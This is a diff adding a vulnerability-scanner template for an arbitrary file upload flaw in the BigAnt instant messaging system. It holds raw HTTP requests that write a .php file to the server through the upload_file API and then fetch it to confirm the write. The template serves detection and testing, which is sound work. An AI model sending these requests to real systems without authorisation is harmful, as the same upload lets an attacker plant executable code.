@@ -1,0 +1,39 @@
+id: damayi-upload_file-upload
+
+info:
+  name: 大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞
+  author: damayi
+  severity: high
+  tags: damayi
+
+http:
+  - raw:
+      - |
+        POST /?m=Api&c=DispersedAddin&a=upload_file HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7npyIb86NUax9Xx
+
+        ------WebKitFormBoundaryl7npyIb86NUax9Xx
+        Content-Disposition: form-data; name="file_info"
+        
+        [{"file_path":"tesd3s6t13.php"}]
+        ------WebKitFormBoundaryl7npyIb86NUax9Xx
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryl7npyIb86NUax9Xx--
+
+      - |+
+        GET /tesd3s6t13.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
